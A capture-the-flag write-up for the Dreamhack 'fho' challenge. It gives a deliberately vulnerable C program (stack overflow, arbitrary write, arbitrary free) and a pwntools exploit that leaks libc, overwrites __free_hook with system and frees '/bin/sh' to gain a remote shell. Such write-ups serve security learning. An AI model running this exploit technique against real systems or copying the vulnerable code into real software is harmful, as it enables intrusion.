## fho
---

```c
// Name: fho.c
// Compile: gcc -o fho fho.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  puts("[2] Arbitary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}
```

<br><br>

## Solution
---

```
[*] '/home/index/fho/fho'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

<br>

```python
from pwn import *

p = remote('host3.dreamhack.games',16610)
#p = process('./fho')
e = ELF('./fho')
libc = ELF('./libc-2.27.so')
# libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so') -> ubuntu 20.04

leak_main_ret = b"A"*0x40 + b"B"*0x8
p.sendafter(b'Buf: ',leak_main_ret)
p.recvuntil(b'Buf: ' + leak_main_ret)
libc_start_main_231 = u64(p.recvn(6)+b"\x00"*2)

# libc_base + libc.symbols['__libc_start_main'] = libc_start_main
# libc_start_main + 231 = libc_start_main_231 
# 20.04에서는 243인데, 위의 라이브러리에서는 231인가보다..

libc_base = libc_start_main_231 - (libc.symbols['__libc_start_main']+231)
system_addr = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols["__free_hook"]
binsh = libc_base + next(libc.search(b'/bin/sh'))

print("@ libc_base: ", hex(libc_base))
print("@ system: ",hex(system_addr))
print("@ free_hook: ", hex(free_hook))
print("@ binsh: ",hex(binsh))

# Arbitary-Address-Write
p.sendlineafter(b'To write: ', str(free_hook))
p.sendlineafter(b'With: ',str(system_addr))

# Exploit
p.sendlineafter(b'To free: ',str(binsh))

p.interactive()
```
